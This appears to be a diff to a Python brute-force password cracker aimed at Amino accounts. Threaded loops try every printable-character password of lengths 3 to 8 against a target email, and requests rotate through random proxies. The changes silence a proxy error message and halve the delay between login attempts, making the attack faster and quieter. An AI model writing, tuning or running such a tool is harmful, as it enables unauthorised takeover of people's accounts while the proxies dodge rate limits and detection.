@@ -181,7 +181,7 @@ def amino_pass(proxy, password,email):
 				proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
 				_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
 	except:
-		print('[Proxy Error] -- > The proxy \'%s\' timed out or failed to connect and this exception loop was triggered (-1 :: Internal Error) !'%str(proxy))
+		#print('[Proxy Error] -- > The proxy \'%s\' timed out or failed to connect and this exception loop was triggered (-1 :: Internal Error) !'%str(proxy))
 		return False
 
 	try: 
@@ -261,7 +261,7 @@ else:
 				x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]),emailToUse,))
 
 				x.start()
-			time.sleep(2)
+			time.sleep(1)
 		time.sleep(2)
 
 	print('Password Crack Attempt with Length of 4 ...')
@@ -275,7 +275,7 @@ else:
 					x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]),emailToUse,))
 
 					x.start()
-				time.sleep(2)
+				time.sleep(1)
 			time.sleep(2)
 		time.sleep(2)
 
@@ -291,7 +291,7 @@ else:
 						x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]),emailToUse,))
 
 						x.start()
-					time.sleep(2)
+					time.sleep(1)
 				time.sleep(2)
 			time.sleep(2)
 		time.sleep(2)
@@ -309,7 +309,7 @@ else:
 							x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]),emailToUse,))
 
 							x.start()
-						time.sleep(2)
+						time.sleep(1)
 					time.sleep(2)
 				time.sleep(2)
 			time.sleep(2)
@@ -329,7 +329,7 @@ else:
 								x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]),emailToUse,))
 
 								x.start()
-							time.sleep(2)
+							time.sleep(1)
 						time.sleep(2)
 					time.sleep(2)
 				time.sleep(2)
@@ -351,7 +351,7 @@ else:
 									x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]+list(string.printable)[bb]),emailToUse,))
 
 									x.start()
-								time.sleep(2)
+								time.sleep(1)
 							time.sleep(2)
 						time.sleep(2)
 					time.sleep(2)
